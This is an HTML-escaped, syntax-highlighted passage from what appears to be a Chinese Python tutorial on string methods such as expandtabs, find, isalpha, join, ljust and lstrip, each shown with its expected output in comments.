&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用 3 个空格:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;expandtabs&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 使用 3 个空格: runoob   12345 abc&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 4 个空格&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用 4 个空格:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;expandtabs&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 使用 4 个空格: runoob  12345   abc&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 5 个空格&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用 5 个空格:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;expandtabs&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 使用 5 个空格: runoob    12345     abc&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 6 个空格&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用 6 个空格:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;expandtabs&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 使用 6 个空格: runoob      12345 abc&lt;/span&gt;

str1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob example....wow!!!&#34;&lt;/span&gt;
str2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;exam&#34;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;find&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 7&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;find&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 7&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;find&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# -1&lt;/span&gt;

str1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob example....wow!!!&#34;&lt;/span&gt;
str2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;exam&#34;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 7&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 7&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(str1.index(str2, 10))  # 异常&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob2016&#34;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 字符串没有空格&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isalnum&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;www.runoob.com&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isalnum&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isalpha&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 字母和中文文字&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob菜鸟教程&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isalpha&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isalpha&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;123456&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isdigit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isdigit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;RUNOOB example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;islower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;islower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob2016&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isnumeric&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;23443434&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isnumeric&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;       &#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isspace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isspace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;This Is String Example...Wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;istitle&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;This is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;istitle&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;THIS IS STRING EXAMPLE....WOW!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isupper&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;THIS is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isupper&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

s1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;-&#34;&lt;/span&gt;
s2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;
seq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;u&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;o&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;o&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 字符串序列&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;seq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# r-u-n-o-o-b&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;seq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# runoob&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 字符串长度&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 6&lt;/span&gt;
l &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 5&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Runoob example....wow!!!**************************&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob EXAMPLE....WOW!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# runoob example....wow!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;     this is string example....wow!!!     &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is string example....wow!!!&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;88888888this is string example....wow!!!8888888&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is string example....wow!!!8888888&lt;/span&gt;

intab &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;aeiou&#34;&lt;/span&gt;
outtab &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;12345&#34;&lt;/span&gt;
